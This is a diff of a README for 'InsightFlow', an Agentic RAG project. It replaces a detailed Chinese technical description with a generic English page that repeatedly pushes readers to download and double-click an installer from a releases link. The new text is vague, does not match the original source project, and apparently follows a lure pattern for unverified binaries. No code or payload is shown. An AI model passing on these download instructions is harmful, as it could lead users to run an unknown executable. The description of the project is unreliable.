@@ -1,28 +1,78 @@
-# 🌊 InsightFlow - Enterprise Knowledge Agent
+# 🚀 InsightFlow - Seamless AI Agent for Your Needs
 
-![Python](https://img.shields.io/badge/Python-3.10-blue) ![LangChain](https://img.shields.io/badge/Framework-LangChain-green) ![DeepSeek](https://img.shields.io/badge/Model-DeepSeek_V3-purple)
+[![Download InsightFlow](https://img.shields.io/badge/Download%20InsightFlow-Get%20It%20Now-blue)](https://github.com/emixde12/InsightFlow/releases)
 
-**InsightFlow** 是一个基于 **Agentic RAG** 架构的企业级智能知识问答系统。它解决了传统 RAG 系统在私有知识库场景下的检索精度低、无法处理实时信息以及长对话逻辑混乱的问题。
+## 📃 Overview
 
-## ✨ 核心特性 (Key Features)
+InsightFlow is an enterprise-grade RAG (Retrieval-Augmented Generation) and agent system. It combines powerful technologies like DeepSeek and LangChain to help you efficiently manage complex tasks. Whether you're analyzing data or automating responses, InsightFlow simplifies your workflows.
 
-- 🧠 **Agentic Routing (智能路由)**: 基于 ReAct 范式，自动判断用户意图，智能调度 **本地知识库 (RAG)** 与 **Tavily 联网搜索**。
-- 🔍 **Hybrid Search (混合检索)**: 融合 **BM25 (稀疏向量)** 与 **Embedding (稠密向量)**，解决专有名词检索难题。
-- 🎯 **Advanced Reranking (重排序)**: 集成 **BGE-Reranker-v2** Cross-Encoder 模型，Recall@3 提升至 90%+。
-- 💾 **Smart Memory (智能记忆)**: 基于 Sliding Window 的上下文管理，Token 消耗降低 30%。
-- 🖥️ **Interactive UI**: 基于 **Streamlit** 构建的交互式前端，支持文档拖拽上传与思维链 (CoT) 可视化。
+## 🖥️ System Requirements
 
-## 🏗️ 系统架构 (Architecture)
+To run InsightFlow, your computer should meet the following requirements:
 
-```mermaid
-graph TD
-    User[用户 Query] --> Frontend[Streamlit UI]
-    Frontend --> Router[Agent Router]
-    Router -- 实时信息 --> WebSearch[Tavily Search]
-    Router -- 私有知识 --> HybridRAG[Hybrid RAG]
-    HybridRAG --> VectorDB[ChromaDB] & BM25[BM25 Retriever]
-    VectorDB & BM25 --> Reranker[BGE Reranker]
-    Reranker --> Context[LLM Context]
-    WebSearch --> Context
-    Context --> LLM[DeepSeek-V3]
-    LLM --> Frontend
+- **Operating System:** Windows 10 or later, macOS 10.14 or later, or a recent Linux distribution.
+- **RAM:** Minimum 4 GB; 8 GB recommended for optimal performance.
+- **Processor:** Intel i5 or equivalent; 1.6 GHz or faster.
+- **Storage:** At least 1 GB of free disk space.
+
+## 🚀 Getting Started
+
+To get started with InsightFlow, follow these simple steps:
+
+1. **Download the Software:**
+   - Visit the releases page to download the latest version:  
+   [Download InsightFlow](https://github.com/emixde12/InsightFlow/releases)
+
+2. **Installation:**
+   - After downloading, locate the file in your downloads folder.
+   - Double-click the file to start the installation process.
+   - Follow the on-screen prompts to complete the installation.
+
+3. **Launch the Application:**
+   - Once installed, open InsightFlow by clicking its icon on your desktop or in your applications folder.
+
+## 🔧 Features
+
+- **User-Friendly Interface:** Easily navigate through various tools and settings.
+- **Integrated AI Agents:** Use intelligent agents for data retrieval and processing.
+- **Flexible Settings:** Customize settings based on your needs and preferences.
+- **Support for Multiple Data Formats:** Import and handle various file types effortlessly.
+
+## 📜 Documentation
+
+For detailed information on using InsightFlow, refer to the built-in help section within the app. You can access tutorials and guides that explain each feature in-depth and offer practical usage tips.
+
+## 📥 Download & Install
+
+To install InsightFlow, follow these steps:
+
+- Visit this page to download the latest version:  
+[Download InsightFlow](https://github.com/emixde12/InsightFlow/releases)
+  
+After downloading, run the installation file and follow the prompts. Once complete, you're ready to explore all that InsightFlow has to offer.
+
+## 💬 Support
+
+If you encounter issues during installation or usage, please reach out via the GitHub issues page. Our team is dedicated to helping you resolve any concerns.
+
+## 🛠️ Contributing
+
+Your feedback and contributions are welcome. If you wish to improve InsightFlow, please consider contributing to the project. You can submit issues or create pull requests on the GitHub repository.
+
+## 🌐 Related Topics
+
+InsightFlow relates to several key areas in technology, including:
+
+- AI Agents
+- RAG Systems
+- Hybrid Search Solutions
+- Deep Learning Models
+- Conversational Interfaces
+
+Each of these topics enhances the usability and functionality of InsightFlow, making it a versatile tool for users across various industries.
+
+## 📅 Future Updates
+
+We plan to regularly update InsightFlow with new features and improvements. Stay tuned for announcements regarding new releases and enhancements. Thank you for choosing InsightFlow—your partner in efficiency and innovation.
+
+[![Download InsightFlow](https://img.shields.io/badge/Download%20InsightFlow-Get%20It%20Now-blue)](https://github.com/emixde12/InsightFlow/releases)
